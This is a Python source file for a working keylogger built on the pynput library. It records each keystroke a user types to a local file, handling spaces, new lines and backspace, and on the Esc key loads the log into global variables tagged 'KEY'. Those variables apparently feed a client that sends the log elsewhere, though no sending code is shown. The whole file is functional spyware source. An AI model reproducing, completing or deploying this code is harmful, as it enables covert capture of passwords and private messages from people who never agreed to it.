from pynput import keyboard

special_keys = [
    keyboard.Key.shift,
    keyboard.Key.ctrl,
    keyboard.Key.caps_lock,
    keyboard.Key.alt,
    keyboard.Key.esc,
    keyboard.Key.delete,
    keyboard.Key.tab,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
    keyboard.Key.home,
    keyboard.Key.end,
    keyboard.Key.page_up,
    keyboard.Key.page_down,
    keyboard.Key.insert,
    keyboard.Key.f1,
    keyboard.Key.f2,
    keyboard.Key.f3,
    keyboard.Key.f4,
    keyboard.Key.f5,
    keyboard.Key.f6,
    keyboard.Key.f7,
    keyboard.Key.f8,
    keyboard.Key.f9,
    keyboard.Key.f10,
    keyboard.Key.f11,
    keyboard.Key.f12
]

def handle_keylog():
    global encoded_message, command_tag, message
    command_tag = "KEY"
    with open("keylog_client.txt", "r", encoding="utf-8") as f:
        message = f.read()
    encoded_message = message.encode("utf-8")
    # print("Keylog uspješno napravljen.")


def on_press(key):
    try:
        # Write the pressed key to a log file
        with open("keylog_client.txt", "r+", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.seek(0, 2)
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.seek(0, 2)
                f.write("\n")
            elif key == keyboard.Key.backspace:
                content = f.read()
                content = content[:-1]
                f.seek(0)
                f.truncate()
                f.write(content)
            elif key in special_keys:
                pass
            else:
                f.seek(0, 2)
                f.write(str(key.char))
    except:
        pass


def on_release(key):
    if key == keyboard.Key.esc:
        handle_keylog()
        # Stop the keylogger when the 'Esc' key is pressed
        return False


with open("keylog_client.txt", "w", encoding="utf-8") as f:
    pass

# Create a listener for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    # Start the listener
    listener.join()